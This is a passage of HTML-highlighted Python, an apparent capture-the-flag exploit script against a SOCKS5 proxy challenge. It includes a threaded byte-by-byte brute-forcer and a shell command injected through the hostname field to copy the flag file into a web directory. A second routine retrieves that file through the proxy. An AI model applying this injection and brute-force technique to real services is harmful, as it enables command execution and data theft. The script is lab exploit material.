style="color:#A65E2B">        self</span><span style="color:#999999">.</span><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recv</span><span style="color:#2993a3">(</span><span style="color:#2F798A">2</span><span style="color:#2993a3">)</span><br><span style="color:#A65E2B">        self</span><span style="color:#999999">.</span><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">send</span><span style="color:#2993a3">(</span><span style="color:#393A34">msg</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">        result </span><span style="color:#999999">=</span><span style="color:#A65E2B"> self</span><span style="color:#999999">.</span><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recv</span><span style="color:#2993a3">(</span><span style="color:#2F798A">2</span><span style="color:#2993a3">)</span><br><span style="color:#A0ADA0">        # info(f"_add result: {result.hex()}")</span><br><span style="color:#1E754F">        if</span><span style="color:#998418"> len</span><span style="color:#2993a3">(</span><span style="color:#393A34">result</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> !=</span><span style="color:#2F798A"> 2</span><span style="color:#999999">:</span><span style="color:#1E754F"> return</span><span style="color:#1E754F"> False</span><br><span style="color:#1E754F">        return</span><span style="color:#393A34"> result</span><span style="color:#2993a3">[</span><span style="color:#2F798A">1</span><span style="color:#2993a3">]</span><span style="color:#AB5959"> ==</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">00</span><br><br><span style="color:#AB5959">    def</span><span style="color:#59873A"> _delete</span><span style="color:#2993a3">(</span><span style="color:#393A34">self</span><span style="color:#999999">,</span><span style="color:#393A34"> msg</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">        res </span><span style="color:#999999">=</span><span style="color:#A65E2B"> self</span><span style="color:#999999">.</span><span style="color:#393A34">choose</span><span style="color:#2993a3">(</span><span style="color:#2F798A">4</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">        if</span><span style="color:#393A34"> res </span><span style="color:#AB5959">!=</span><span style="color:#2F798A"> 4</span><span style="color:#999999">:</span><span style="color:#1E754F"> return</span><span style="color:#1E754F"> None</span><br><span style="color:#A65E2B">        self</span><span style="color:#999999">.</span><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recv</span><span style="color:#2993a3">(</span><span style="color:#2F798A">2</span><span style="color:#2993a3">)</span><br><span style="color:#A65E2B">        self</span><span style="color:#999999">.</span><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">send</span><span style="color:#2993a3">(</span><span style="color:#393A34">msg</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">        result </span><span style="color:#999999">=</span><span style="color:#A65E2B"> self</span><span style="color:#999999">.</span><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recv</span><span style="color:#2993a3">(</span><span style="color:#2F798A">2</span><span style="color:#2993a3">)</span><br><span style="color:#A0ADA0">        # info(f"_delete result: {result.hex()}")</span><br><span style="color:#1E754F">        if</span><span style="color:#998418"> len</span><span style="color:#2993a3">(</span><span style="color:#393A34">result</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> !=</span><span style="color:#2F798A"> 2</span><span style="color:#999999">:</span><span style="color:#1E754F"> return</span><span style="color:#1E754F"> False</span><br><span style="color:#1E754F">        return</span><span style="color:#393A34"> result</span><span style="color:#2993a3">[</span><span style="color:#2F798A">1</span><span style="color:#2993a3">]</span><span style="color:#AB5959"> ==</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">00</span><br><br><span style="color:#AB5959">    def</span><span style="color:#59873A"> _sock</span><span style="color:#2993a3">(</span><span style="color:#393A34">self</span><span style="color:#999999">,</span><span style="color:#393A34"> content</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#1E754F">        if</span><span style="color:#A65E2B"> self</span><span style="color:#999999">.</span><span style="color:#393A34">choose</span><span style="color:#2993a3">(</span><span style="color:#2F798A">5</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> !=</span><span style="color:#2F798A"> 5</span><span style="color:#999999">:</span><span style="color:#1E754F"> return</span><span style="color:#1E754F"> False</span><br><span style="color:#1E754F">        if</span><span style="color:#A65E2B"> self</span><span style="color:#999999">.</span><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recv</span><span style="color:#2993a3">(</span><span style="color:#2F798A">2</span><span style="color:#999999">,</span><span style="color:#B07D48"> timeout</span><span style="color:#999999">=</span><span style="color:#2F798A">3</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> !=</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">'</span><span style="color:#A65E2B">\x05\x01</span><span style="color:#B5695977">'</span><span style="color:#999999">:</span><span style="color:#1E754F"> return</span><span style="color:#1E754F"> False</span><br><span style="color:#A65E2B">        self</span><span style="color:#999999">.</span><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">send</span><span style="color:#2993a3">(</span><span style="color:#393A34">content</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">        result </span><span style="color:#999999">=</span><span style="color:#A65E2B"> self</span><span style="color:#999999">.</span><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recv</span><span style="color:#2993a3">(</span><span style="color:#2F798A">2</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">        if</span><span style="color:#998418"> len</span><span style="color:#2993a3">(</span><span style="color:#393A34">result</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> !=</span><span style="color:#2F798A"> 2</span><span style="color:#AB5959"> or</span><span style="color:#393A34"> result</span><span style="color:#2993a3">[</span><span style="color:#2F798A">1</span><span style="color:#2993a3">]</span><span style="color:#AB5959"> !=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">00</span><span style="color:#999999">:</span><span style="color:#1E754F"> return</span><span style="color:#1E754F"> False</span><br><br><span style="color:#393A34">        req </span><span style="color:#999999">=</span><span style="color:#393A34"> p8</span><span style="color:#2993a3">(</span><span style="color:#2F798A">5</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> p8</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> p8</span><span style="color:#2993a3">(</span><span style="color:#2F798A">0</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> p8</span><span style="color:#2993a3">(</span><span style="color:#2F798A">3</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">        target_host </span><span style="color:#999999">=</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">'</span><span style="color:#B56959">aaaaaaaa</span><span style="color:#B5695977">'</span><br><span style="color:#393A34">        req </span><span style="color:#999999">+=</span><span style="color:#393A34"> p8</span><span style="color:#2993a3">(</span><span style="color:#998418">len</span><span style="color:#1e754f">(</span><span style="color:#393A34">target_host</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> target_host</span><br><span style="color:#393A34">        req </span><span style="color:#999999">+=</span><span style="color:#393A34"> p16</span><span style="color:#2993a3">(</span><span style="color:#2F798A">80</span><span style="color:#2993a3">)</span><br><span style="color:#A65E2B">        self</span><span style="color:#999999">.</span><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">send</span><span style="color:#2993a3">(</span><span style="color:#393A34">req</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">        response </span><span style="color:#999999">=</span><span style="color:#A65E2B"> self</span><span style="color:#999999">.</span><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recv</span><span style="color:#2993a3">(</span><span style="color:#2F798A">10</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">        return</span><span style="color:#998418"> len</span><span style="color:#2993a3">(</span><span style="color:#393A34">response</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> ==</span><span style="color:#2F798A"> 10</span><span style="color:#AB5959"> and</span><span style="color:#393A34"> response</span><span style="color:#2993a3">[</span><span style="color:#2F798A">0</span><span style="color:#2993a3">]</span><span style="color:#AB5959"> ==</span><span style="color:#2F798A"> 5</span><br><br><span style="color:#AB5959">    def</span><span style="color:#59873A"> _reset</span><span style="color:#2993a3">(</span><span style="color:#393A34">self</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#1E754F">        if</span><span style="color:#A65E2B"> self</span><span style="color:#999999">.</span><span style="color:#393A34">choose</span><span style="color:#2993a3">(</span><span style="color:#2F798A">6</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> !=</span><span style="color:#2F798A"> 6</span><span style="color:#999999">:</span><span style="color:#1E754F"> return</span><span style="color:#1E754F"> False</span><br><span style="color:#393A34">        result </span><span style="color:#999999">=</span><span style="color:#A65E2B"> self</span><span style="color:#999999">.</span><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recv</span><span style="color:#2993a3">(</span><span style="color:#2F798A">2</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">        if</span><span style="color:#998418"> len</span><span style="color:#2993a3">(</span><span style="color:#393A34">result</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> !=</span><span style="color:#2F798A"> 2</span><span style="color:#999999">:</span><span style="color:#1E754F"> return</span><span style="color:#1E754F"> False</span><br><span style="color:#1E754F">        return</span><span style="color:#393A34"> result</span><span style="color:#2993a3">[</span><span style="color:#2F798A">1</span><span style="color:#2993a3">]</span><span style="color:#AB5959"> ==</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">00</span><br><br><span style="color:#AB5959">    def</span><span style="color:#59873A"> system</span><span style="color:#2993a3">(</span><span style="color:#393A34">self</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#1E754F">        if</span><span style="color:#A65E2B"> self</span><span style="color:#999999">.</span><span style="color:#393A34">choose</span><span style="color:#2993a3">(</span><span style="color:#2F798A">5</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> !=</span><span style="color:#2F798A"> 5</span><span style="color:#999999">:</span><span style="color:#1E754F"> return</span><span style="color:#1E754F"> False</span><br><span style="color:#1E754F">        if</span><span style="color:#A65E2B"> self</span><span style="color:#999999">.</span><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recv</span><span style="color:#2993a3">(</span><span style="color:#2F798A">2</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> !=</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">'</span><span style="color:#A65E2B">\x05\x01</span><span style="color:#B5695977">'</span><span style="color:#999999">:</span><span style="color:#1E754F"> return</span><span style="color:#1E754F"> False</span><br><span style="color:#A65E2B">        self</span><span style="color:#999999">.</span><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">send</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">a</span><span style="color:#A65E2B">\x00</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">        result </span><span style="color:#999999">=</span><span style="color:#A65E2B"> self</span><span style="color:#999999">.</span><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recv</span><span style="color:#2993a3">(</span><span style="color:#2F798A">2</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">        if</span><span style="color:#998418"> len</span><span style="color:#2993a3">(</span><span style="color:#393A34">result</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> !=</span><span style="color:#2F798A"> 2</span><span style="color:#AB5959"> or</span><span style="color:#393A34"> result</span><span style="color:#2993a3">[</span><span style="color:#2F798A">1</span><span style="color:#2993a3">]</span><span style="color:#AB5959"> !=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">00</span><span style="color:#999999">:</span><span style="color:#1E754F"> return</span><span style="color:#1E754F"> False</span><br><br><span style="color:#393A34">        target_host </span><span style="color:#999999">=</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">'</span><span style="color:#B56959">cat /home/ctf/flag > /home/ctf/web/flag.html</span><span style="color:#B5695977">'</span><br><span style="color:#393A34">        req </span><span style="color:#999999">=</span><span style="color:#393A34"> p8</span><span style="color:#2993a3">(</span><span style="color:#2F798A">5</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> p8</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> p8</span><span style="color:#2993a3">(</span><span style="color:#2F798A">0</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> p8</span><span style="color:#2993a3">(</span><span style="color:#2F798A">3</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">        req </span><span style="color:#999999">+=</span><span style="color:#393A34"> p8</span><span style="color:#2993a3">(</span><span style="color:#998418">len</span><span style="color:#1e754f">(</span><span style="color:#393A34">target_host</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> target_host</span><br><span style="color:#393A34">        req </span><span style="color:#999999">+=</span><span style="color:#393A34"> p16</span><span style="color:#2993a3">(</span><span style="color:#2F798A">80</span><span style="color:#2993a3">)</span><br><span style="color:#A65E2B">        self</span><span style="color:#999999">.</span><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">send</span><span style="color:#2993a3">(</span><span style="color:#393A34">req</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">        response </span><span style="color:#999999">=</span><span style="color:#A65E2B"> self</span><span style="color:#999999">.</span><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recv</span><span style="color:#2993a3">(</span><span style="color:#2F798A">10</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">        if</span><span style="color:#998418"> len</span><span style="color:#2993a3">(</span><span style="color:#393A34">response</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> !=</span><span style="color:#2F798A"> 10</span><span style="color:#AB5959"> or</span><span style="color:#393A34"> response</span><span style="color:#2993a3">[</span><span style="color:#2F798A">0</span><span style="color:#2993a3">]</span><span style="color:#AB5959"> !=</span><span style="color:#2F798A"> 5</span><span style="color:#999999">:</span><span style="color:#1E754F"> return</span><span style="color:#1E754F"> False</span><br><span style="color:#1E754F">        return</span><span style="color:#393A34"> response</span><span style="color:#2993a3">[</span><span style="color:#2F798A">1</span><span style="color:#2993a3">]</span><span style="color:#AB5959"> ==</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">00</span><br><br><span style="color:#AB5959">    def</span><span style="color:#59873A"> close</span><span style="color:#2993a3">(</span><span style="color:#393A34">self</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#1E754F">        if</span><span style="color:#A65E2B"> self</span><span style="color:#999999">.</span><span style="color:#393A34">io</span><span style="color:#999999">:</span><br><span style="color:#A65E2B">            self</span><span style="color:#999999">.</span><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">close</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><br><span style="color:#AB5959">    def</span><span style="color:#59873A"> read_flag</span><span style="color:#2993a3">(</span><span style="color:#393A34">self</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#1E754F">        if</span><span style="color:#A65E2B"> self</span><span style="color:#999999">.</span><span style="color:#393A34">choose</span><span style="color:#2993a3">(</span><span style="color:#2F798A">5</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> !=</span><span style="color:#2F798A"> 5</span><span style="color:#999999">:</span><br><span style="color:#1E754F">            return</span><span style="color:#1E754F"> False</span><br><span style="color:#393A34">        ack </span><span style="color:#999999">=</span><span style="color:#A65E2B"> self</span><span style="color:#999999">.</span><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recv</span><span style="color:#2993a3">(</span><span style="color:#2F798A">2</span><span style="color:#999999">,</span><span style="color:#B07D48"> timeout</span><span style="color:#999999">=</span><span style="color:#2F798A">2</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">        if</span><span style="color:#393A34"> ack </span><span style="color:#AB5959">!=</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">'</span><span style="color:#A65E2B">\x05\x01</span><span style="color:#B5695977">'</span><span style="color:#999999">:</span><br><span style="color:#1E754F">            return</span><span style="color:#1E754F"> False</span><br><span style="color:#A65E2B">        self</span><span style="color:#999999">.</span><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">send</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">a</span><span style="color:#A65E2B">\x00</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">        result </span><span style="color:#999999">=</span><span style="color:#A65E2B"> self</span><span style="color:#999999">.</span><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recv</span><span style="color:#2993a3">(</span><span style="color:#2F798A">2</span><span style="color:#999999">,</span><span style="color:#B07D48"> timeout</span><span style="color:#999999">=</span><span style="color:#2F798A">200</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">        if</span><span style="color:#998418"> len</span><span style="color:#2993a3">(</span><span style="color:#393A34">result</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> !=</span><span style="color:#2F798A"> 2</span><span style="color:#999999">:</span><br><span style="color:#1E754F">            return</span><span style="color:#1E754F"> False</span><br><span style="color:#393A34">        status </span><span style="color:#999999">=</span><span style="color:#393A34"> result</span><span style="color:#2993a3">[</span><span style="color:#2F798A">1</span><span style="color:#2993a3">]</span><br><span style="color:#1E754F">        if</span><span style="color:#393A34"> status </span><span style="color:#AB5959">==</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">01</span><span style="color:#999999">:</span><br><span style="color:#1E754F">            return</span><span style="color:#1E754F"> False</span><br><span style="color:#1E754F">        elif</span><span style="color:#393A34"> status </span><span style="color:#AB5959">==</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">00</span><span style="color:#999999">:</span><br><span style="color:#1E754F">            pass</span><br><span style="color:#1E754F">        else</span><span style="color:#999999">:</span><br><span style="color:#1E754F">            return</span><span style="color:#1E754F"> False</span><br><br><span style="color:#393A34">        target_host </span><span style="color:#999999">=</span><span style="color:#B5695977"> '</span><span style="color:#B56959">1.0.0.127</span><span style="color:#B5695977">'</span><br><span style="color:#393A34">        target_port </span><span style="color:#999999">=</span><span style="color:#2F798A"> 37151</span><br><br><span style="color:#393A34">        req </span><span style="color:#999999">=</span><span style="color:#393A34"> p8</span><span style="color:#2993a3">(</span><span style="color:#2F798A">5</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> p8</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> p8</span><span style="color:#2993a3">(</span><span style="color:#2F798A">0</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> p8</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">        ip </span><span style="color:#999999">=</span><span style="color:#393A34"> struct</span><span style="color:#999999">.</span><span style="color:#393A34">unpack</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">!l</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#393A34"> socket</span><span style="color:#999999">.</span><span style="color:#393A34">inet_aton</span><span style="color:#1e754f">(</span><span style="color:#393A34">target_host</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><span style="color:#2993a3">[</span><span style="color:#2F798A">0</span><span style="color:#2993a3">]</span><br><br><span style="color:#393A34">        req </span><span style="color:#999999">+=</span><span style="color:#393A34"> p32</span><span style="color:#2993a3">(</span><span style="color:#393A34">ip</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> p16</span><span style="color:#2993a3">(</span><span style="color:#393A34">target_port</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">        pause</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#A65E2B">        self</span><span style="color:#999999">.</span><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">send</span><span style="color:#2993a3">(</span><span style="color:#393A34">req</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">        response </span><span style="color:#999999">=</span><span style="color:#A65E2B"> self</span><span style="color:#999999">.</span><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recv</span><span style="color:#2993a3">(</span><span style="color:#2F798A">10</span><span style="color:#999999">,</span><span style="color:#B07D48"> timeout</span><span style="color:#999999">=</span><span style="color:#2F798A">200</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">        if</span><span style="color:#998418"> len</span><span style="color:#2993a3">(</span><span style="color:#393A34">response</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> !=</span><span style="color:#2F798A"> 10</span><span style="color:#999999">:</span><br><span style="color:#1E754F">            return</span><span style="color:#1E754F"> False</span><br><span style="color:#393A34">        ver </span><span style="color:#999999">=</span><span style="color:#393A34"> response</span><span style="color:#2993a3">[</span><span style="color:#2F798A">0</span><span style="color:#2993a3">]</span><br><span style="color:#393A34">        rep </span><span style="color:#999999">=</span><span style="color:#393A34"> response</span><span style="color:#2993a3">[</span><span style="color:#2F798A">1</span><span style="color:#2993a3">]</span><br><span style="color:#1E754F">        if</span><span style="color:#393A34"> ver </span><span style="color:#AB5959">!=</span><span style="color:#2F798A"> 5</span><span style="color:#999999">:</span><br><span style="color:#1E754F">            return</span><span style="color:#1E754F"> False</span><br><span style="color:#1E754F">        if</span><span style="color:#393A34"> rep </span><span style="color:#AB5959">==</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">00</span><span style="color:#999999">:</span><br><span style="color:#A65E2B">            self</span><span style="color:#999999">.</span><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">send</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">GET /flag.html HTTP/1.1</span><span style="color:#A65E2B">\r\n</span><span style="color:#B56959">Host: localhost</span><span style="color:#A65E2B">\r\n\r\n</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">            data </span><span style="color:#999999">=</span><span style="color:#A65E2B"> self</span><span style="color:#999999">.</span><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recvall</span><span style="color:#2993a3">(</span><span style="color:#B07D48">timeout</span><span style="color:#999999">=</span><span style="color:#2F798A">100</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">            info</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"Received data: </span><span style="color:#1e754f">{</span><span style="color:#393A34">data</span><span style="color:#1e754f">}</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">            return</span><span style="color:#1E754F"> True</span><br><span style="color:#1E754F">        else</span><span style="color:#999999">:</span><br><span style="color:#1E754F">            return</span><span style="color:#1E754F"> False</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> add</span><span style="color:#2993a3">(</span><span style="color:#393A34">content</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#1E754F">    try</span><span style="color:#999999">:</span><br><span style="color:#393A34">        pwn </span><span style="color:#999999">=</span><span style="color:#393A34"> SOCK5Pwn</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">        pwn</span><span style="color:#999999">.</span><span style="color:#393A34">_add</span><span style="color:#2993a3">(</span><span style="color:#393A34">content</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">        pwn</span><span style="color:#999999">.</span><span style="color:#393A34">close</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">    except</span><span style="color:#998418"> Exception</span><span style="color:#1E754F"> as</span><span style="color:#393A34"> e</span><span style="color:#999999">:</span><br><span style="color:#1E754F">        pass</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> delete</span><span style="color:#2993a3">(</span><span style="color:#393A34">content</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#1E754F">    try</span><span style="color:#999999">:</span><br><span style="color:#393A34">        pwn </span><span style="color:#999999">=</span><span style="color:#393A34"> SOCK5Pwn</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">        res </span><span style="color:#999999">=</span><span style="color:#393A34"> pwn</span><span style="color:#999999">.</span><span style="color:#393A34">_delete</span><span style="color:#2993a3">(</span><span style="color:#393A34">content</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">        pwn</span><span style="color:#999999">.</span><span style="color:#393A34">close</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">        return</span><span style="color:#393A34"> res</span><br><span style="color:#1E754F">    except</span><span style="color:#998418"> Exception</span><span style="color:#1E754F"> as</span><span style="color:#393A34"> e</span><span style="color:#999999">:</span><br><span style="color:#1E754F">        return</span><span style="color:#1E754F"> False</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> reset</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#1E754F">    try</span><span style="color:#999999">:</span><br><span style="color:#393A34">        pwn </span><span style="color:#999999">=</span><span style="color:#393A34"> SOCK5Pwn</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">        pwn</span><span style="color:#999999">.</span><span style="color:#393A34">_reset</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">        pwn</span><span style="color:#999999">.</span><span style="color:#393A34">close</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">    except</span><span style="color:#999999">:</span><br><span style="color:#1E754F">        pass</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> sock</span><span style="color:#2993a3">(</span><span style="color:#393A34">content</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#1E754F">    try</span><span style="color:#999999">:</span><br><span style="color:#393A34">        pwn </span><span style="color:#999999">=</span><span style="color:#393A34"> SOCK5Pwn</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">        res </span><span style="color:#999999">=</span><span style="color:#393A34"> pwn</span><span style="color:#999999">.</span><span style="color:#393A34">_sock</span><span style="color:#2993a3">(</span><span style="color:#393A34">content</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">        pwn</span><span style="color:#999999">.</span><span style="color:#393A34">close</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">        return</span><span style="color:#393A34"> res</span><br><span style="color:#1E754F">    except</span><span style="color:#999999">:</span><br><span style="color:#1E754F">        return</span><span style="color:#1E754F"> False</span><br><br><br><span style="color:#393A34">sol </span><span style="color:#999999">=</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">""</span><br><span style="color:#393A34">sol_lock </span><span style="color:#999999">=</span><span style="color:#393A34"> threading</span><span style="color:#999999">.</span><span style="color:#393A34">Lock</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">byte_found_event </span><span style="color:#999999">=</span><span style="color:#393A34"> threading</span><span style="color:#999999">.</span><span style="color:#393A34">Event</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> brute_worker</span><span style="color:#2993a3">(</span><span style="color:#393A34">byte_range</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#AB5959">    global</span><span style="color:#393A34"> sol</span><br><span style="color:#393A34">    current_sol </span><span style="color:#999999">=</span><span style="color:#393A34"> sol</span><br><span style="color:#1E754F">    for</span><span style="color:#393A34"> j </span><span style="color:#1E754F">in</span><span style="color:#393A34"> byte_range</span><span style="color:#999999">:</span><br><span style="color:#1E754F">        if</span><span style="color:#393A34"> byte_found_event</span><span style="color:#999999">.</span><span style="color:#393A34">is_set</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#1E754F">            return</span><br><br><span style="color:#393A34">        m </span><span style="color:#999999">=</span><span style="color:#393A34"> current_sol </span><span style="color:#AB5959">+</span><span style="color:#393A34"> p8</span><span style="color:#2993a3">(</span><span style="color:#393A34">j</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> +</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#A65E2B">\x00</span><span style="color:#B5695977">"</span><br><span style="color:#1E754F">        if</span><span style="color:#393A34"> sock</span><span style="color:#2993a3">(</span><span style="color:#393A34">m</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#1E754F">            with</span><span style="color:#393A34"> sol_lock</span><span style="color:#999999">:</span><br><span style="color:#1E754F">                if</span><span style="color:#998418"> len</span><span style="color:#2993a3">(</span><span style="color:#393A34">sol</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> ==</span><span style="color:#998418"> len</span><span style="color:#2993a3">(</span><span style="color:#393A34">current_sol</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">                    sol </span><span style="color:#999999">+=</span><span style="color:#393A34"> p8</span><span style="color:#2993a3">(</span><span style="color:#393A34">j</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">                    info</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"Found byte => </span><span style="color:#1e754f">{</span><span style="color:#998418">hex</span><span 